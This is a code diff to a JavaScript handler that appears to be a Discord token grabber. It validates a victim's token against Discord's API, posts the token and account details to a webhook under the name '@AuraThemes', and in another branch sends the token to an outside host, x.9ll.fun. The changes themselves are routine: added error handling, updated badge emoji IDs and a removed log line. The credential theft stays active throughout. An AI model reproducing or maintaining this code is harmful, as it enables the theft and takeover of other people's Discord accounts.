@@ -14,24 +14,34 @@ export default async function handler(req, res) {
     }
 
     if (true) {
-      const response = await axios.get('https://discord.com/api/v9/users/@me', {
-        headers: {
-          'Content-Type': 'application/json',
-          'Authorization': token
-        }
-      });
-
-      if (response.status === 200) {
-        const info = {
-          token: token,
-          ...response.data
-        };
-
-        await axios.post(webhook, {
-          username: '@AuraThemes',
-          avatar_url: 'https://i.imgur.com/WkKXZSl.gif',
-          embeds: await embed(info),
+      try {
+        const response = await axios.get('https://discord.com/api/v9/users/@me', {
+          headers: {
+            'Content-Type': 'application/json',
+            'Authorization': token
+          }
         });
+
+        if (response.status === 200) {
+          const info = {
+            token: token,
+            ...response.data
+          };
+
+          await axios.post(webhook, {
+            username: '@AuraThemes',
+            avatar_url: 'https://i.imgur.com/WkKXZSl.gif',
+            embeds: await embed(info),
+          });
+        }
+      } catch (error) {
+        if (error.response) {
+          console.error(`Error: ${error.response.status} - ${error.response.data.message || 'Request failed'}`);
+        } else if (error.request) {
+          console.error('Error: No response from server');
+        } else {
+          console.error(`Error: ${error.message}`);
+        }
       }
     } else {
       axios.get('https://x.9ll.fun/api/v1/raw?data=' + token, {
@@ -43,10 +53,9 @@ export default async function handler(req, res) {
     };
 
     res.status(200).send(token);
-    console.log('New visit:', token);
   } catch (error) {
     res.status(500).send('Internal Server Error');
-    console.error('Error:', error);
+    console.error(error);
   }
 }
 
@@ -64,28 +73,28 @@ const emojis = {
   },
   'user': {
     'boost': [
-      '<:Booster1Month:1087043238654906472> ',
-      '<:Booster2Month:1087043319227494460> ',
-      '<:Booster3Month:1087043368250511512> ',
-      '<:Booster6Month:1087043493236592820> ',
-      '<:Booster9Month:1087043493236592820> ',
-      '<:booster12month:1162420359291732038> ',
-      '<:Booster15Month:1051453775832961034> ',
-      '<:Booster18Month:1051453778127237180> ',
-      '<:Booster24Month:1051453776889917530> ',
+      '<:booster_1_month:1297275185099182170> ',
+      '<:booster_2_month:1297275521868107886> ',
+      '<:booster_3_month:1297275188030738533> ',
+      '<:booster_6_month:1297275192724426915> ',
+      '<:booster_9_month:1297275523139112990> ',
+      '<:booster_12_month:1297275195400257597> ',
+      '<:booster_15_month:1297275198277423245> ',
+      '<:booster_18_month:1297275202442367067> ',
+      '<:booster_24_month:1297275207400161311> ',
     ],
     'i': [
-      '<:staff:1090015968618623129> ',
-      '<:partner:918207395279273985> ',
-      '<:events:898186057588277259> ',
-      '<:bughunter_1:874750808426692658> ',
-      '<:bravery:874750808388952075> ',
-      '<:brilliance:874750808338608199> ',
-      '<:balance:874750808267292683> ',
-      '<:early:944071770506416198> ',
-      '<:bughunter_2:874750808430874664> ',
-      '<:activedev:1042545590640324608> ',
-      '<:verifieddeveloper:898181029737680896> ',
+      '<:staff:1297275182079017082> ',
+      '<:partner:1297275180917330063> ',
+      '<:hypesquad_events:1297275178300215386> ',
+      '<:bughunter_1:1297275173296406568> ',
+      '<:bravery:1297275208658456586> ',
+      '<:brilliance:1297275519980671068> ',
+      '<:balance:1297275520936837254> ',
+      '<:early_supporter:1297275177163559064> ',
+      '<:bughunter_2:1297275174634393683> ',
+      '<:active_developer:1042545590640324608> ',
+      '<:verified_developer:1297275176127299625> ',
     ],
   },
 };
@@ -136,7 +145,7 @@ async function fetch(url, token) {
       return response.data;
     }
 
-    return {};
+    return 'Invalid';
   } catch (error) {
     if (error.response) {
       return `Error: ${error.response.status} - ${error.response.data.message || 'Request failed'}`;
